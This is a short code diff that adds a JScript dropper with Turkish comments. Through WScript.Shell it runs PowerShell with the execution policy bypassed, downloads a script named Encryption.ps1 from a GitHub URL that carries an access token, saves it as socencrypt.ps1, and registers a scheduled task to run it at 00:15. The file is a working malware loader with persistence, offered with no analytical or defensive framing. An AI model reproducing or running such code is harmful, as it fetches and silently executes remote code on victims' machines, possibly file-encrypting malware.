@@ -1,1 +1,7 @@
-Invoke-WebRequest -Uri "https://github.com/ggok01/victory/blob/main/Encryption.ps1" -OutFile "$env:USERPROFILE\Downloads\socenc.ps1"
+var goo = new ActiveXObject("WScript.Shell");
+
+// PowerShell scripti indirme
+goo.Run("powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ggok01/victory/main/Encryption.ps1?token=GHSAT0AAAAAACRKUIVKEB6SPJ3RORPQTWIWZRGYCIA' -OutFile 'C:\\Users\\Calculus\\Downloads\\socencrypt.ps1'\"");
+
+// Scheduled task oluşturma (Belirli saatte çalışacak şekilde)
+goo.Run("powershell.exe -ExecutionPolicy Bypass -Command \"Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Bypass -File C:\\Users\\Calculus\\Downloads\\socencrypt.ps1') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date '00:15')) -TaskName 'RunMyScript' -Description 'Runs the socencrypt.ps1 script'\"");
